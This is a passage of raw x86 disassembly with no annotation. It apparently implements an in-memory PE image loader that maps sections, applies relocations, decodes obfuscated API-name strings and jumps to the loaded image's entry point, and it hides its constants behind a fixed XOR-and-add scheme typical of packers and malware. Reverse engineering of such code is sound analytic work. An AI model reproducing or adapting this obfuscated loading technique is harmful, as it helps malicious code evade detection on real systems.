  41ca3c:	mov    edi,DWORD PTR [ebp-0x14]
  41ca3f:	mov    esi,DWORD PTR [eax]
  41ca41:	sub    esi,edx
  41ca43:	add    edi,esi
  41ca45:	movzx  esi,WORD PTR [ebx]
  41ca48:	shr    esi,0xc
  41ca4b:	xor    edi,ecx
  41ca4d:	mov    DWORD PTR [ebp-0x20],edi
  41ca50:	mov    DWORD PTR [ebp-0x14],esi
  41ca53:	mov    esi,DWORD PTR [ebp-0x20]
  41ca56:	mov    edi,DWORD PTR [ebp+0x8]
  41ca59:	xor    esi,ecx
  41ca5b:	lea    esi,[esi+edi*1+0x3272e0]
  41ca62:	mov    DWORD PTR [ebp-0x20],esi
  41ca65:	mov    esi,DWORD PTR [ebp-0x10]
  41ca68:	mov    edi,DWORD PTR [ebp-0x14]
  41ca6b:	xor    esi,ecx
  41ca6d:	add    esi,edx
  41ca6f:	cmp    edi,esi
  41ca71:	jne    0x41ca89
  41ca73:	mov    esi,DWORD PTR [ebp-0x10]
  41ca76:	mov    edi,DWORD PTR [ebp-0x14]
  41ca79:	xor    esi,ecx
  41ca7b:	add    esi,edx
  41ca7d:	cmp    edi,esi
  41ca7f:	jne    0x41ca89
  41ca81:	mov    esi,DWORD PTR [ebp-0x20]
  41ca84:	mov    edi,DWORD PTR [ebp-0x24]
  41ca87:	add    DWORD PTR [esi],edi
  41ca89:	add    ebx,0x2
  41ca8c:	dec    DWORD PTR [ebp-0x18]
  41ca8f:	jne    0x41ca30
  41ca91:	mov    ebx,DWORD PTR [ebp-0xc]
  41ca94:	add    DWORD PTR [ebp-0x8],ebx
  41ca97:	mov    esi,DWORD PTR [ebp-0x1c]
  41ca9a:	mov    edi,DWORD PTR [ebp-0x8]
  41ca9d:	mov    ebx,DWORD PTR [ebp+0xc]
  41caa0:	xor    esi,ecx
  41caa2:	cmp    edi,DWORD PTR [ebx+esi*8+0x193977c]
  41caa9:	jae    0x41cac3
  41caab:	add    eax,DWORD PTR [ebp-0xc]
  41caae:	mov    esi,DWORD PTR [ebp-0x4]
  41cab1:	mov    ebx,DWORD PTR [eax+0x4]
  41cab4:	xor    esi,ecx
  41cab6:	add    esi,edx
  41cab8:	mov    DWORD PTR [ebp-0xc],ebx
  41cabb:	cmp    ebx,esi
  41cabd:	jne    0x41ca17
  41cac3:	pop    ebx
  41cac4:	mov    eax,DWORD PTR [ebp-0x28]
  41cac7:	pop    edi
  41cac8:	jmp    0x41cacd
  41caca:	mov    eax,DWORD PTR [ebp-0x4]
  41cacd:	xor    eax,ecx
  41cacf:	add    eax,edx
  41cad1:	pop    esi
  41cad2:	leave  
  41cad3:	ret    0x8
  41cad6:	push   ebp
  41cad7:	mov    ebp,esp
  41cad9:	sub    esp,0xcc
  41cadf:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41cae6:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  41caed:	mov    eax,DWORD PTR [ebp-0x4]
  41caf0:	push   ebx
  41caf1:	push   esi
  41caf2:	mov    esi,0x7510899
  41caf7:	xor    eax,esi
  41caf9:	push   edi
  41cafa:	mov    edi,0x3272e0
  41caff:	add    eax,edi
  41cb01:	mov    DWORD PTR [ebp-0x1c],eax
  41cb04:	mov    eax,DWORD PTR [ebp-0x4]
  41cb07:	xor    eax,esi
  41cb09:	add    eax,edi
  41cb0b:	mov    DWORD PTR [ebp-0x8],eax
  41cb0e:	mov    ebx,DWORD PTR [ebp+0x20]
  41cb11:	mov    eax,DWORD PTR [ebp-0x14]
  41cb14:	mov    ecx,DWORD PTR [ebp-0x14]
  41cb17:	xor    eax,ecx
  41cb19:	mov    DWORD PTR [ebp-0x14],eax
  41cb1c:	add    DWORD PTR [ebp-0x14],0xf89cb5b9
  41cb23:	mov    eax,DWORD PTR [ebp-0xc]
  41cb26:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb29:	xor    eax,ecx
  41cb2b:	mov    DWORD PTR [ebp-0xc],eax
  41cb2e:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  41cb35:	mov    eax,DWORD PTR [ebp-0x10]
  41cb38:	mov    ecx,DWORD PTR [ebp-0x10]
  41cb3b:	xor    eax,ecx
  41cb3d:	mov    DWORD PTR [ebp-0x10],eax
  41cb40:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  41cb47:	mov    eax,DWORD PTR [ebp-0x20]
  41cb4a:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb4d:	xor    eax,ecx
  41cb4f:	mov    DWORD PTR [ebp-0x20],eax
  41cb52:	add    DWORD PTR [ebp-0x20],0xf89f05b9
  41cb59:	mov    eax,0x9471
  41cb5e:	mov    WORD PTR [ebp+0x20],ax
  41cb62:	mov    eax,DWORD PTR [ebp+0x8]
  41cb65:	test   eax,eax
  41cb67:	je     0x41cfc2
  41cb6d:	mov    eax,DWORD PTR [ebp+0xc]
  41cb70:	test   eax,eax
  41cb72:	je     0x41cfc2
  41cb78:	mov    eax,DWORD PTR [ebp+0x18]
  41cb7b:	test   eax,eax
  41cb7d:	je     0x41cfc2
  41cb83:	mov    ax,WORD PTR [ebp+0x20]
  41cb87:	mov    ecx,0x8a8c
  41cb8c:	xor    ax,cx
  41cb8f:	mov    ecx,0x3b50
  41cb94:	add    ax,cx
  41cb97:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb9a:	cmp    WORD PTR [ecx],ax
  41cb9d:	jne    0x41cfc2
  41cba3:	mov    eax,DWORD PTR [ebp-0x4]
  41cba6:	xor    eax,esi
  41cba8:	add    eax,edi
  41cbaa:	mov    DWORD PTR [ebp-0x30],eax
  41cbad:	mov    eax,DWORD PTR [ebp-0x4]
  41cbb0:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbb3:	mov    eax,DWORD PTR [ebp+0x8]
  41cbb6:	add    eax,DWORD PTR [ecx+0x3c]
  41cbb9:	mov    DWORD PTR [ebp+0xc],eax
  41cbbc:	mov    eax,DWORD PTR [eax+0x50]
  41cbbf:	test   eax,eax
  41cbc1:	je     0x41cfc2
  41cbc7:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  41cbce:	mov    eax,DWORD PTR [ebp-0x2c]
  41cbd1:	xor    eax,esi
  41cbd3:	add    eax,edi
  41cbd5:	mov    DWORD PTR [ebp-0x2c],eax
  41cbd8:	mov    eax,DWORD PTR [ebp-0x4]
  41cbdb:	mov    eax,DWORD PTR [ebx+0x190]
  41cbe1:	mov    ecx,DWORD PTR [eax]
  41cbe3:	mov    ecx,DWORD PTR [ecx+0x3c]
  41cbe6:	add    ecx,DWORD PTR [eax]
  41cbe8:	mov    eax,DWORD PTR [ebp-0x4]
  41cbeb:	mov    eax,DWORD PTR [ebx+0x18c]
  41cbf1:	mov    edx,DWORD PTR [eax]
  41cbf3:	mov    DWORD PTR [ebp-0x18],ecx
  41cbf6:	mov    DWORD PTR [ebp+0x20],edx
  41cbf9:	cmp    edx,edx
  41cbfb:	jne    0x41cc2f
  41cbfd:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cc03:	lea    edx,[ebp-0x1c]
  41cc06:	push   edx
  41cc07:	mov    edx,DWORD PTR [ebp-0xc]
  41cc0a:	xor    edx,esi
  41cc0c:	add    edx,edi
  41cc0e:	push   edx
  41cc0f:	push   DWORD PTR [ecx+0x50]
  41cc12:	push   DWORD PTR [ebp+0x20]
  41cc15:	call   DWORD PTR [eax+0x1c]
  41cc18:	mov    eax,DWORD PTR [ebp-0x18]
  41cc1b:	mov    ecx,DWORD PTR [eax+0x54]
  41cc1e:	mov    eax,DWORD PTR [eax+0x50]
  41cc21:	sub    eax,ecx
  41cc23:	add    ecx,DWORD PTR [ebp+0x20]
  41cc26:	push   ecx
  41cc27:	call   0x41d5ae
  41cc2c:	mov    edx,DWORD PTR [ebp+0x20]
  41cc2f:	mov    eax,DWORD PTR [ebx+0x194]
  41cc35:	mov    DWORD PTR [eax],edx
  41cc37:	mov    eax,DWORD PTR [ebp+0xc]
  41cc3a:	push   DWORD PTR [eax+0x54]
  41cc3d:	push   DWORD PTR [ebp+0x8]
  41cc40:	push   edx
  41cc41:	call   0x41d455
  41cc46:	mov    ecx,DWORD PTR [ebp+0x20]
  41cc49:	mov    eax,DWORD PTR [ecx+0x3c]
  41cc4c:	add    eax,ecx
  41cc4e:	movzx  ecx,WORD PTR [eax+0x14]
  41cc52:	lea    ecx,[ecx+eax*1+0x18]
  41cc56:	mov    DWORD PTR [ebp+0x18],ecx
  41cc59:	mov    ecx,DWORD PTR [ebp-0x4]
  41cc5c:	movzx  edx,WORD PTR [eax+0x6]
  41cc60:	xor    ecx,esi
  41cc62:	add    ecx,edi
  41cc64:	mov    DWORD PTR [ebp+0xc],eax
  41cc67:	cmp    edx,ecx
  41cc69:	je     0x41cd16
  41cc6f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cc72:	xor    ecx,esi
  41cc74:	add    ecx,edi
  41cc76:	mov    DWORD PTR [ebp-0x8],ecx
  41cc79:	mov    ecx,DWORD PTR [ebp-0x24]
  41cc7c:	movzx  edx,WORD PTR [eax+0x6]
  41cc80:	xor    ecx,esi
  41cc82:	sub    edx,ecx
  41cc84:	sub    edx,edi
  41cc86:	cmp    DWORD PTR [ebp-0x8],edx
  41cc89:	ja     0x41cd16
  41cc8f:	mov    edx,DWORD PTR [ebp+0x18]
  41cc92:	add    edx,0x8
  41cc95:	mov    DWORD PTR [ebp+0x18],edx
  41cc98:	jmp    0x41cc9d
  41cc9a:	mov    edx,DWORD PTR [ebp+0x18]
  41cc9d:	mov    eax,DWORD PTR [eax+0x38]
  41cca0:	lea    ecx,[eax-0x1]
  41cca3:	mov    DWORD PTR [ebp-0x34],eax
  41cca6:	mov    eax,DWORD PTR [edx]
  41cca8:	test   ecx,eax
  41ccaa:	je     0x41ccb3
  41ccac:	not    ecx
  41ccae:	and    eax,ecx
  41ccb0:	add    eax,DWORD PTR [ebp-0x34]
  41ccb3:	mov    ecx,DWORD PTR [edx+0x4]
  41ccb6:	add    ecx,DWORD PTR [ebp+0x20]
  41ccb9:	push   ecx
  41ccba:	call   0x41d5ae
  41ccbf:	mov    edx,DWORD PTR [ebp-0x4]
  41ccc2:	mov    eax,DWORD PTR [ebp+0x18]
  41ccc5:	mov    ecx,DWORD PTR [eax+0x8]
  41ccc8:	xor    edx,esi
  41ccca:	add    edx,edi
  41cccc:	cmp    ecx,edx
  41ccce:	je     0x41cce7
  41ccd0:	push   ecx
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	add    ecx,DWORD PTR [eax+0xc]
  41ccd7:	mov    eax,DWORD PTR [eax+0x4]
  41ccda:	add    eax,DWORD PTR [ebp+0x20]
  41ccdd:	push   ecx
  41ccde:	push   eax
  41ccdf:	call   0x41d455
  41cce4:	mov    eax,DWORD PTR [ebp+0x18]
  41cce7:	mov    ecx,DWORD PTR [ebp-0x24]
  41ccea:	mov    edx,DWORD PTR [ebp-0x8]
  41cced:	add    eax,0x28
  41ccf0:	xor    ecx,esi
  41ccf2:	lea    ecx,[edx+ecx*1+0x3272e0]
  41ccf9:	mov    edx,DWORD PTR [ebp+0xc]
  41ccfc:	mov    DWORD PTR [ebp+0x18],eax
  41ccff:	mov    eax,DWORD PTR [ebp-0x24]
  41cd02:	movzx  edx,WORD PTR [edx+0x6]
  41cd06:	xor    eax,esi
  41cd08:	sub    edx,eax
  41cd0a:	mov    eax,DWORD PTR [ebp+0xc]
  41cd0d:	sub    edx,edi
  41cd0f:	mov    DWORD PTR [ebp-0x8],ecx
  41cd12:	cmp    ecx,edx
  41cd14:	jbe    0x41cc9a
  41cd16:	mov    edx,DWORD PTR [ebx+0x18c]
  41cd1c:	mov    ecx,DWORD PTR [ebp+0x20]
  41cd1f:	cmp    ecx,DWORD PTR [edx]
  41cd21:	jne    0x41cd4a
  41cd23:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cd29:	lea    edx,[ebp-0x1c]
  41cd2c:	push   edx
  41cd2d:	mov    edx,DWORD PTR [ebp-0x10]
  41cd30:	xor    edx,esi
  41cd32:	add    edx,edi
  41cd34:	push   edx
  41cd35:	mov    edx,DWORD PTR [ebp-0x18]
  41cd38:	push   DWORD PTR [edx+0x54]
  41cd3b:	push   ecx
  41cd3c:	call   DWORD PTR [eax+0x1c]
  41cd3f:	test   eax,eax
  41cd41:	je     0x41cfb3
  41cd47:	mov    eax,DWORD PTR [ebp+0xc]
  41cd4a:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41cd50:	mov    ecx,DWORD PTR [ecx]
  41cd52:	xor    ecx,esi
  41cd54:	add    ecx,edi
  41cd56:	je     0x41cede
  41cd5c:	and    DWORD PTR [ebp-0x28],0x0
  41cd60:	and    DWORD PTR [ebp+0x8],0x0
  41cd64:	mov    eax,0xf89c851d
  41cd69:	lea    ecx,[eax-0x8]
  41cd6c:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41cd73:	mov    DWORD PTR [ebp-0x48],0xf89c850d
  41cd7a:	mov    DWORD PTR [ebp-0x44],eax
  41cd7d:	mov    DWORD PTR [ebp-0x40],ecx
  41cd80:	mov    DWORD PTR [ebp-0x3c],ecx
  41cd83:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  41cd8a:	mov    edx,DWORD PTR [ebp+0x8]
  41cd8d:	mov    ecx,0x899
  41cd92:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41cd97:	mov    edx,0x72e0
  41cd9c:	add    cx,dx
  41cd9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cda2:	inc    DWORD PTR [ebp+0x8]
  41cda5:	cmp    DWORD PTR [ebp+0x8],0x6
  41cda9:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41cdb1:	jb     0x41cd8a
  41cdb3:	mov    ecx,0xf89c850b
  41cdb8:	mov    DWORD PTR [ebp-0xa4],eax
  41cdbe:	mov    DWORD PTR [ebp-0x90],eax
  41cdc4:	mov    DWORD PTR [ebp-0x68],eax
  41cdc7:	mov    DWORD PTR [ebp-0x64],eax
  41cdca:	lea    eax,[ecx-0x1]
  41cdcd:	mov    edx,0xf89c85ff
  41cdd2:	mov    DWORD PTR [ebp-0x58],eax
  41cdd5:	mov    DWORD PTR [ebp-0x54],eax
  41cdd8:	mov    DWORD PTR [ebp-0xa8],0xf89c85f5
  41cde2:	mov    DWORD PTR [ebp-0xa0],ecx
  41cde8:	mov    DWORD PTR [ebp-0x9c],edx
  41cdee:	mov    DWORD PTR [ebp-0x98],0xf89c8510
  41cdf8:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ce02:	mov    DWORD PTR [ebp-0x8c],0xf89c85fc
  41ce0c:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ce16:	mov    DWORD PTR [ebp-0x84],0xf89c850d
  41ce20:	mov    DWORD PTR [ebp-0x80],ecx
  41ce23:	mov    DWORD PTR [ebp-0x7c],0xf89c8500
  41ce2a:	mov    DWORD PTR [ebp-0x78],edx
  41ce2d:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41ce34:	mov    DWORD PTR [ebp-0x70],ecx
  41ce37:	mov    DWORD PTR [ebp-0x6c],0xf89c85f8
  41ce3e:	mov    DWORD PTR [ebp-0x60],ecx
  41ce41:	mov    DWORD PTR [ebp-0x5c],0xf89c851c
  41ce48:	mov    DWORD PTR [ebp-0x50],0xf89c85b9
  41ce4f:	xor    eax,eax
  41ce51:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41ce58:	xor    cl,0x99
  41ce5b:	sub    cl,0x20
  41ce5e:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41ce65:	inc    eax
  41ce66:	cmp    eax,0x17
  41ce69:	jb     0x41ce51
  41ce6b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ce71:	lea    ecx,[ebp-0xb4]
  41ce77:	push   ecx
  41ce78:	call   DWORD PTR [eax+0x4]
  41ce7b:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41ce81:	lea    edx,[ebp-0xcc]
  41ce87:	push   edx
  41ce88:	push   eax
  41ce89:	call   DWORD PTR [ecx+0x8]
  41ce8c:	lea    ecx,[ebp-0x28]
  41ce8f:	push   ecx
  41ce90:	mov    ecx,DWORD PTR [ebx+0x18c]
  41ce96:	push   DWORD PTR [ecx]
  41ce98:	call   eax
  41ce9a:	mov    eax,DWORD PTR [ebp-0x28]
  41ce9d:	test   eax,eax
  41ce9f:	je     0x41cedb
  41cea1:	mov    DWORD PTR [ebp+0x8],eax
  41cea4:	jmp    0x41ceb0
  41cea6:	mov    eax,DWORD PTR [eax]
  41cea8:	mov    DWORD PTR [ebp-0x28],eax
  41ceab:	cmp    eax,DWORD PTR [ebp+0x8]
  41ceae:	je     0x41cebd
  41ceb0:	mov    edx,DWORD PTR [eax+0x18]
  41ceb3:	mov    ecx,DWORD PTR [ebx+0x18c]
  41ceb9:	cmp    edx,DWORD PTR [ecx]
  41cebb:	jne    0x41cea6
  41cebd:	mov    edx,DWORD PTR [eax+0x18]
  41cec0:	mov    ecx,DWORD PTR [ebx+0x18c]
  41cec6:	cmp    edx,DWORD PTR [ecx]
  41cec8:	jne    0x41cedb
  41ceca:	mov    edx,DWORD PTR [ebp-0x18]
  41cecd:	mov    ecx,DWORD PTR [ebx+0x190]
  41ced3:	mov    edx,DWORD PTR [edx+0x28]
  41ced6:	add    edx,DWORD PTR [ecx]
  41ced8:	mov    DWORD PTR [eax+0x1c],edx
  41cedb:	mov    eax,DWORD PTR [ebp+0xc]
  41cede:	push   ebx
  41cedf:	push   eax
  41cee0:	push   DWORD PTR [ebp+0x20]
  41cee3:	call   0x41c68d
  41cee8:	test   eax,eax
  41ceea:	je     0x41cfb3
  41cef0:	push   DWORD PTR [ebp+0xc]
  41cef3:	mov    ecx,ebx
  41cef5:	push   DWORD PTR [ebp+0x20]
  41cef8:	call   0x41c5e6
  41cefd:	test   eax,eax
  41ceff:	je     0x41cfb3
  41cf05:	mov    eax,DWORD PTR [ebp+0xc]
  41cf08:	mov    edx,DWORD PTR [ebp+0x20]
  41cf0b:	mov    ecx,ebx
  41cf0d:	call   0x41c4bf
  41cf12:	test   eax,eax
  41cf14:	je     0x41cfb3
  41cf1a:	push   ebx
  41cf1b:	push   DWORD PTR [ebp+0x20]
  41cf1e:	call   0x41c970
  41cf23:	test   eax,eax
  41cf25:	je     0x41cfb3
  41cf2b:	mov    eax,DWORD PTR [ebx+0x18c]
  41cf31:	mov    edx,DWORD PTR [ebp+0x20]
  41cf34:	cmp    edx,DWORD PTR [eax]
  41cf36:	jne    0x41cf52
  41cf38:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cf3e:	lea    ecx,[ebp-0x1c]
  41cf41:	push   ecx
  41cf42:	push   DWORD PTR [ebp-0x1c]
  41cf45:	mov    ecx,DWORD PTR [ebp-0x18]
  41cf48:	push   DWORD PTR [ecx+0x54]
  41cf4b:	push   edx
  41cf4c:	call   DWORD PTR [eax+0x1c]
  41cf4f:	mov    edx,DWORD PTR [ebp+0x20]
  41cf52:	mov    eax,DWORD PTR [ebx+0x1c8]
  41cf58:	mov    eax,DWORD PTR [eax]
  41cf5a:	xor    eax,esi
  41cf5c:	add    eax,edi
  41cf5e:	je     0x41cf97
  41cf60:	mov    ecx,DWORD PTR [ebp+0xc]
  41cf63:	mov    eax,DWORD PTR [ecx+0x28]
  41cf66:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  41cf6d:	mov    esi,DWORD PTR [ebp+0x8]
  41cf70:	push   DWORD PTR [ebp+0x14]
  41cf73:	xor    esi,0x899
  41cf79:	push   DWORD PTR [ebp+0x10]
  41cf7c:	add    esi,0x72e0
  41cf82:	or     WORD PTR [ecx+0x16],si
  41cf86:	add    eax,edx
  41cf88:	push   edx
  41cf89:	call   eax
  41cf8b:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b8
  41cf95:	jmp    0x41cfa1
  41cf97:	mov    eax,DWORD PTR [ebp+0xc]
  41cf9a:	mov    eax,DWORD PTR [eax+0x28]
  41cf9d:	add    eax,edx
  41cf9f:	call   eax
  41cfa1:	mov    DWORD PTR [ebp-0x8],eax
  41cfa4:	mov    eax,DWORD PTR [ebp-0x8]
  41cfa7:	mov    ecx,DWORD PTR [ebp+0x1c]
  41cfaa:	mov    DWORD PTR [ecx],eax
  41cfac:	mov    DWORD PTR [ebp-0x30],0x1
  41cfb3:	cmp    DWORD PTR [ebp-0x30],0x0
  41cfb7:	jne    0x41cfbd
  41cfb9:	and    DWORD PTR [ebp+0x20],0x0
  41cfbd:	mov    eax,DWORD PTR [ebp+0x20]
  41cfc0:	jmp    0x41cfc4
  41cfc2:	xor    eax,eax
  41cfc4:	pop    edi
  41cfc5:	pop    esi
  41cfc6:	pop    ebx
  41cfc7:	leave  
  41cfc8:	ret    0x1c
  41cfcb:	push   ebp
  41cfcc:	mov    ebp,esp
  41cfce:	movzx  edx,WORD PTR [ecx+0x6]
  41cfd2:	movzx  eax,WORD PTR [ecx+0x14]
  41cfd6:	push   ebx
  41cfd7:	push   edi
  41cfd8:	xor    edi,edi
  41cfda:	lea    eax,[eax+ecx*1+0x18]
  41cfde:	test   edx,edx
  41cfe0:	je     0x41d001
  41cfe2:	mov    ecx,DWORD PTR [eax+0xc]
  41cfe5:	lea    ebx,[ecx+esi*1]
  41cfe8:	cmp    DWORD PTR [ebp+0x8],ebx
  41cfeb:	jb     0x41cff9
  41cfed:	mov    ebx,DWORD PTR [eax+0x8]
  41cff0:	add    ebx,ecx
  41cff2:	add    ebx,esi
  41cff4:	cmp    DWORD PTR [ebp+0x8],ebx
  41cff7:	jb     0x41d003
  41cff9:	add    eax,0x28
  41cffc:	inc    edi
  41cffd:	cmp    edi,edx
  41cfff:	jb     0x41cfe2
  41d001:	xor    eax,eax
  41d003:	pop    edi
  41d004:	pop    ebx
  41d005:	pop    ebp
  41d006:	ret    0x4
  41d009:	push   ebp
  41d00a:	mov    ebp,esp
  41d00c:	sub    esp,0x34
  41d00f:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41d016:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41d01d:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41d024:	mov    DWORD PTR [ebp-0x8],0xf89c8518
  41d02b:	mov    DWORD PTR [ebp-0x20],0xf89c85f8
  41d032:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41d039:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41d040:	mov    DWORD PTR [ebp-0x10],eax
  41d043:	mov    eax,DWORD PTR [ebp+0x8]
  41d046:	mov    DWORD PTR [ebp-0x14],eax
  41d049:	mov    eax,DWORD PTR [ebp-0xc]
  41d04c:	push   ebx
  41d04d:	mov    ecx,0x7510899
  41d052:	xor    eax,ecx
  41d054:	push   esi
  41d055:	mov    esi,DWORD PTR [ebp-0x10]
  41d058:	mov    edx,0x3272e0
  41d05d:	add    eax,edx
  41d05f:	push   edi
  41d060:	cmp    esi,eax
  41d062:	je     0x41d241
  41d068:	mov    eax,DWORD PTR [ebp-0xc]
  41d06b:	mov    esi,DWORD PTR [ebp-0x14]
  41d06e:	xor    eax,ecx
  41d070:	add    eax,edx
  41d072:	cmp    esi,eax
  41d074:	je     0x41d241
  41d07a:	mov    eax,DWORD PTR [ebp-0xc]
  41d07d:	xor    eax,ecx
  41d07f:	add    eax,edx
  41d081:	mov    DWORD PTR [ebp-0x24],eax
  41d084:	mov    eax,DWORD PTR [ebp-0xc]
  41d087:	xor    eax,ecx
  41d089:	add    eax,edx
  41d08b:	mov    DWORD PTR [ebp-0x28],eax
  41d08e:	mov    edi,DWORD PTR [ebp-0x20]
  41d091:	mov    ebx,DWORD PTR [ebp-0x8]
  41d094:	mov    esi,0x899
  41d099:	xor    edi,esi
  41d09b:	mov    eax,0x72e0
  41d0a0:	xor    ebx,esi
  41d0a2:	add    edi,eax
  41d0a4:	add    ebx,eax
  41d0a6:	sub    ebx,edi
  41d0a8:	mov    WORD PTR [ebp-0x8],bx
  41d0ac:	jmp    0x41d171
  41d0b1:	mov    edi,DWORD PTR [ebp-0xc]
  41d0b4:	mov    bx,WORD PTR [ebp-0x4]
  41d0b8:	xor    edi,esi
  41d0ba:	add    edi,eax
  41d0bc:	cmp    bx,di
  41d0bf:	je     0x41d1b3
  41d0c5:	mov    edi,DWORD PTR [ebp-0xc]
  41d0c8:	mov    ebx,DWORD PTR [ebp+0xc]
  41d0cb:	xor    edi,ecx
  41d0cd:	add    edi,edx
  41d0cf:	cmp    ebx,edi
  41d0d1:	mov    di,WORD PTR [ebp-0x4]
  41d0d5:	mov    bx,WORD PTR [ebp+0x8]
  41d0d9:	je     0x41d144
  41d0db:	cmp    bx,di
  41d0de:	je     0x41d14d
  41d0e0:	mov    edi,DWORD PTR [ebp-0x20]
  41d0e3:	mov    bx,WORD PTR [ebp+0x8]
  41d0e7:	xor    edi,esi
  41d0e9:	add    edi,eax
  41d0eb:	cmp    bx,di
  41d0ee:	jb     0x41d10e
  41d0f0:	mov    edi,DWORD PTR [ebp-0x2c]
  41d0f3:	mov    bx,WORD PTR [ebp+0x8]
  41d0f7:	xor    edi,esi
  41d0f9:	add    edi,eax
  41d0fb:	cmp    bx,di
  41d0fe:	ja     0x41d10e
  41d100:	movzx  edi,WORD PTR [ebp+0x8]
  41d104:	movzx  ebx,WORD PTR [ebp-0x8]
  41d108:	add    edi,ebx
  41d10a:	mov    WORD PTR [ebp+0x8],di
  41d10e:	mov    edi,DWORD PTR [ebp-0x20]
  41d111:	mov    bx,WORD PTR [ebp-0x4]
  41d115:	xor    edi,esi
  41d117:	add    edi,eax
  41d119:	cmp    bx,di
  41d11c:	jb     0x41d13c
  41d11e:	mov    edi,DWORD PTR [ebp-0x2c]
  41d121:	mov    bx,WORD PTR [ebp-0x4]
  41d125:	xor    edi,esi
  41d127:	add    edi,eax
  41d129:	cmp    bx,di
  41d12c:	ja     0x41d13c
  41d12e:	movzx  edi,WORD PTR [ebp-0x4]
  41d132:	movzx  ebx,WORD PTR [ebp-0x8]
  41d136:	add    edi,ebx
  41d138:	mov    WORD PTR [ebp-0x4],di
  41d13c:	mov    di,WORD PTR [ebp-0x4]
  41d140:	mov    bx,WORD PTR [ebp+0x8]
  41d144:	cmp    bx,di
  41d147:	jne    0x41d241
  41d14d:	mov    edi,DWORD PTR [ebp-0x1c]
  41d150:	mov    ebx,DWORD PTR [ebp-0x10]
  41d153:	xor    edi,ecx
  41d155:	lea    edi,[edi+ebx*1+0x3272e0]
  41d15c:	mov    DWORD PTR [ebp-0x10],edi
  41d15f:	mov    edi,DWORD PTR [ebp-0x1c]
  41d162:	mov    ebx,DWORD PTR [ebp-0x14]
  41d165:	xor    edi,ecx
  41d167:	lea    edi,[edi+ebx*1+0x3272e0]
  41d16e:	mov    DWORD PTR [ebp-0x14],edi
  41d171:	mov    edi,DWORD PTR [ebp-0x24]
  41d174:	mov    ebx,DWORD PTR [ebp-0x10]
  41d177:	mov    di,WORD PTR [ebx+edi*2]
  41d17b:	mov    WORD PTR [ebp+0x8],di
  41d17f:	mov    edi,DWORD PTR [ebp-0x28]
  41d182:	mov    ebx,DWORD PTR [ebp-0x14]
  41d185:	mov    di,WORD PTR [ebx+edi*2]
  41d189:	mov    WORD PTR [ebp-0x4],di
  41d18d:	mov    edi,DWORD PTR [ebp-0xc]
  41d190:	mov    bx,WORD PTR [ebp+0x8]
  41d194:	xor    edi,esi
  41d196:	add    edi,eax
  41d198:	cmp    bx,di
  41d19b:	jne    0x41d0b1
  41d1a1:	mov    eax,DWORD PTR [ebp-0x18]
  41d1a4:	mov    esi,DWORD PTR [ebp-0xc]
  41d1a7:	xor    eax,ecx
  41d1a9:	add    eax,edx
  41d1ab:	imul   eax,esi
  41d1ae:	mov    DWORD PTR [ebp-0xc],eax
  41d1b1:	jmp    0x41d1c5
  41d1b3:	mov    eax,DWORD PTR [ebp-0xc]
  41d1b6:	mov    esi,DWORD PTR [ebp-0x18]
  41d1b9:	xor    eax,ecx
  41d1bb:	lea    eax,[eax+esi*1+0x3272e0]
  41d1c2:	mov    DWORD PTR [ebp-0x18],eax
  41d1c5:	mov    eax,DWORD PTR [ebp-0x24]
  41d1c8:	sub    eax,edx
  41d1ca:	xor    eax,ecx
  41d1cc:	mov    DWORD PTR [ebp-0x30],eax
  41d1cf:	mov    eax,DWORD PTR [ebp-0x28]
  41d1d2:	sub    eax,edx
  41d1d4:	xor    eax,ecx
  41d1d6:	mov    DWORD PTR [ebp-0x34],eax
  41d1d9:	mov    eax,DWORD PTR [ebp-0x34]
  41d1dc:	mov    esi,DWORD PTR [ebp-0x1c]
  41d1df:	xor    esi,ecx
  41d1e1:	add    esi,edx
  41d1e3:	xor    eax,ecx
  41d1e5:	add    eax,0x3272e0
  41d1ea:	imul   esi,eax
  41d1ed:	mov    eax,DWORD PTR [ebp-0x14]
  41d1f0:	movzx  eax,WORD PTR [esi+eax*1]
  41d1f4:	mov    esi,DWORD PTR [ebp-0x30]
  41d1f7:	mov    edi,DWORD PTR [ebp-0x1c]
  41d1fa:	xor    esi,ecx
  41d1fc:	add    esi,edx
  41d1fe:	xor    edi,ecx
  41d200:	add    edi,edx
  41d202:	imul   edi,esi
  41d205:	mov    esi,DWORD PTR [ebp-0x10]
  41d208:	movzx  esi,WORD PTR [edi+esi*1]
  41d20c:	sub    eax,edx
  41d20e:	sub    esi,edx
  41d210:	xor    eax,ecx
  41d212:	xor    esi,ecx
  41d214:	cmp    esi,eax
  41d216:	jne    0x41d241
  41d218:	mov    eax,DWORD PTR [ebp-0x30]
  41d21b:	mov    esi,DWORD PTR [ebp-0x1c]
  41d21e:	xor    eax,ecx
  41d220:	add    eax,0x3272e0
